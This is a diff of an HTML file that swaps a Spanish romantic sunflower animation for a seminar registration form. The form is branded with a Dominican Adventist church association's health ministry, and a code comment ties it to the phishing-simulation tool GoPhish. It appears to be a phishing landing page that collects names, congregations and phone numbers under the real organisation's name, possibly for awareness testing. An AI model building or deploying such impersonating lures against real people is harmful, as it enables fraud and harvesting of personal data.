@@ -1,229 +1,69 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-<meta charset="UTF-8">
-<title>Para ti 💛</title>
-
-<style>
-body {
-    margin: 0;
-    height: 100vh;
-    background: linear-gradient(to top, #fff3b0, #ffd60a);
-    font-family: 'Segoe UI', sans-serif;
-    overflow: hidden;
-}
-
-/* Pantalla inicial */
-.inicio {
-    position: absolute;
-    width: 100%;
-    height: 100%;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    font-size: 50px;
-    color: #5c4d00;
-    cursor: pointer;
-    transition: opacity 1s ease;
-}
-
-.oculto {
-    opacity: 0;
-    pointer-events: none;
-}
-
-/* Escena */
-.escena {
-    opacity: 0;
-    transition: opacity 2s ease;
-}
-
-.visible {
-    opacity: 1;
-}
-
-/* Texto lado */
-.mensaje {
-    position: absolute;
-    right: 8%;
-    top: 35%;
-    width: 300px;
-    text-align: center;
-    font-size: 22px;
-    color: #5c4d00;
-    line-height: 1.6;
-    opacity: 0;
-    transition: opacity 2s ease;
-
-    background: rgba(255, 255, 255, 0.3);
-    padding: 20px;
-    border-radius: 20px;
-    backdrop-filter: blur(5px);
-}
-
-/* Contenedor planta */
-.container {
-    position: absolute;
-    bottom: 0;
-    left: 30%;
-}
-
-/* Tallo */
-.stem {
-    width: 6px;
-    height: 0;
-    background: #2e7d32;
-    border-radius: 5px;
-    animation: grow 4s forwards;
-}
-
-@keyframes grow {
-    to { height: 320px; }
-}
-
-/* Hoja */
-.leaf {
-    position: absolute;
-    width: 40px;
-    height: 20px;
-    background: #2e7d32;
-    border-radius: 20px 0;
-    transform: rotate(-30deg);
-    opacity: 0;
-    animation: aparecer 1s forwards;
-}
-
-/* Girasol GRANDE */
-.sunflower {
-    position: absolute;
-    width: 100px;
-    height: 100px;
-    transform: scale(0);
-    animation: bloom 0.8s forwards;
-}
-
-/* Centro */
-.center {
-    position: absolute;
-    width: 40px;
-    height: 40px;
-    background: #5c3d00;
-    border-radius: 50%;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%);
-}
-
-/* Pétalos */
-.petal {
-    position: absolute;
-    width: 30px;
-    height: 15px;
-    background: #ffcc00;
-    border-radius: 10px;
-    top: 50%;
-    left: 50%;
-    transform-origin: center left;
-}
-
-/* Animaciones */
-@keyframes bloom {
-    to { transform: scale(1); }
-}
-
-@keyframes aparecer {
-    to { opacity: 1; }
-}
-</style>
+    <meta charset="UTF-8">
+    <title>Registro: Seminario de Salud Integral - Cuerpo Sano, Mente Sana</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f6f8; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .form-container { background: #ffffff; max-width: 520px; width: 100%; padding: 35px; border-top: 6px solid #002d56; box-shadow: 0 4px 15px rgba(0,0,0,0.08); border-radius: 4px; box-sizing: border-box; }
+        
+        /* Estilos para la cabecera doble con los nuevos logos */
+        .logo-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; padding-bottom: 15px; border-bottom: 1px solid #e2e8f0; }
+        .logo-left { max-width: 140px; height: auto; }
+        .logo-right { max-width: 150px; height: auto; }
+        
+        .header-title { color: #002d56; font-size: 20px; font-weight: bold; margin-bottom: 5px; text-align: center; text-transform: uppercase; letter-spacing: 0.5px; }
+        .header-subtitle { color: #777777; font-size: 13px; text-align: center; margin-bottom: 20px; font-weight: 600; }
+        .event-banner { background-color: #f0f4f8; border-left: 4px solid #b28330; padding: 15px; margin-bottom: 25px; border-radius: 0 4px 4px 0; }
+        .event-banner p { margin: 6px 0; font-size: 14px; color: #333333; }
+        .guest-highlight { font-weight: bold; color: #002d56; }
+        .date-highlight, .location-highlight { color: #b28330; font-weight: bold; }
+        label { display: block; font-weight: 600; margin-bottom: 6px; color: #444444; font-size: 14px; }
+        .required-mark { color: #cc0000; margin-left: 3px; }
+        input[type="text"], input[type="tel"] { width: 100%; padding: 11px; margin-bottom: 20px; border: 1px solid #cccccc; border-radius: 4px; box-sizing: border-box; font-size: 15px; background-color: #fafafa; transition: border-color 0.2s; }
+        input:focus { border-color: #002d56; background-color: #ffffff; outline: none; }
+        .btn-submit { background-color: #002d56; color: white; border: none; padding: 13px; width: 100%; font-size: 16px; border-radius: 4px; cursor: pointer; font-weight: bold; transition: background 0.2s; letter-spacing: 0.5px; }
+        .btn-submit:hover { background-color: #001a33; }
+    </style>
 </head>
-
 <body>
 
-<!-- Pantalla inicial -->
-<div class="inicio" id="inicio" onclick="empezar()">
-    💛 Para ti 💛
-</div>
-
-<!-- Escena -->
-<div class="escena" id="escena">
-
-    <div class="container">
-        <div class="stem" id="stem"></div>
+<div class="form-container">
+    
+    <!-- Cabecera de Logos Duplicados -->
+    <div class="logo-header">
+        <!-- Reemplaza 'RUTA_DE_TU_SERVIDOR/' por el enlace web real donde subas la imagen -->
+        <img src="logo iglesia.png" alt="Logo Iglesia Adventista" class="logo-left">
+        <img src="Logo-Salud-Adventista-gris.png" alt="Logo Ministerio de la Salud" class="logo-right">
     </div>
 
-    <div class="mensaje" id="mensaje">
-        Te amo como los girasoles al sol 🌻<br><br>
-        incluso en la oscuridad,<br>
-        siempre encuentro la forma de volver hacia ti 💛<br><br>
-        pase lo que pase ✨
+    <div class="header-title">Asociación Dominicana del Sureste</div>
+    <div class="header-subtitle">Departamento de Ministerios de la Salud</div>
+    
+    <!-- Detalles del Evento -->
+    <div class="event-banner">
+        <p><strong>Actividad:</strong> Seminario de Salud Integral: "Cuerpo Sano, Mente Sana"</p>
+        <p><strong>Expositora Especial:</strong> <span class="guest-highlight">Dra. Yaderis Barreiro</span></p>
+        <p><strong>Fecha y Hora:</strong> <span class="date-highlight">Domingo 19 de Julio, 2026 — 10:00 AM</span></p>
+        <p><strong>Lugar:</strong> <span class="location-highlight">Salón de Eventos Víctor Leger (2do Piso, ADOSE)</span></p>
+        <p style="font-size: 13px; color: #666; margin-top: 10px; border-top: 1px dashed #ccc; padding-top: 8px;">Por favor, complete sus datos obligatorios para formalizar su inscripción y asegurar su cupo en el salón.</p>
     </div>
-
+    
+    <!-- Formulario Seguro para GoPhish -->
+    <form method="POST">
+        
+        <label for="nombre">Nombre Completo:<span class="required-mark">*</span></label>
+        <input type="text" id="nombre" name="nombre" placeholder="Ej. Juan Pérez" required>
+        
+        <label for="iglesia">Iglesia / Congregación:<span class="required-mark">*</span></label>
+        <input type="text" id="iglesia" name="iglesia" placeholder="Ej. Iglesia Central" required>
+        
+        <label for="telefono">Número de Teléfono / WhatsApp:<span class="required-mark">*</span></label>
+        <input type="tel" id="telefono" name="telefono" placeholder="Ej. 809-555-5555" required>
+        
+        <button type="submit" class="btn-submit">Confirmar Registro Obligatorio</button>
+    </form>
 </div>
-
-<script>
-const inicio = document.getElementById("inicio");
-const escena = document.getElementById("escena");
-const stem = document.getElementById("stem");
-const mensaje = document.getElementById("mensaje");
-
-function empezar() {
-    inicio.classList.add("oculto");
-
-    setTimeout(() => {
-        escena.classList.add("visible");
-
-        setTimeout(crearPlanta, 4000);
-
-        setTimeout(() => {
-            mensaje.style.opacity = "1";
-        }, 5000);
-
-    }, 1000);
-}
-
-/* Hoja */
-function hoja(top, left, delay) {
-    const leaf = document.createElement("div");
-    leaf.className = "leaf";
-    leaf.style.top = top + "px";
-    leaf.style.left = left + "px";
-    leaf.style.animationDelay = delay + "s";
-    stem.appendChild(leaf);
-}
-
-/* Girasol */
-function girasol(top, left, delay) {
-    const f = document.createElement("div");
-    f.className = "sunflower";
-    f.style.top = top + "px";
-    f.style.left = left + "px";
-    f.style.animationDelay = delay + "s";
-
-    for (let i = 0; i < 12; i++) {
-        const p = document.createElement("div");
-        p.className = "petal";
-        p.style.transform = `rotate(${i * 30}deg) translateX(25px)`;
-        f.appendChild(p);
-    }
-
-    const c = document.createElement("div");
-    c.className = "center";
-    f.appendChild(c);
-
-    stem.appendChild(f);
-}
-
-/* Crear planta */
-function crearPlanta() {
-    hoja(80, -35, 0);
-    hoja(160, 5, 0.5);
-
-    girasol(40, -40, 0);
-    girasol(130, 30, 0.5);
-    girasol(220, -50, 1);
-    girasol(280, 25, 1.5);
-}
-</script>
 
 </body>
 </html>
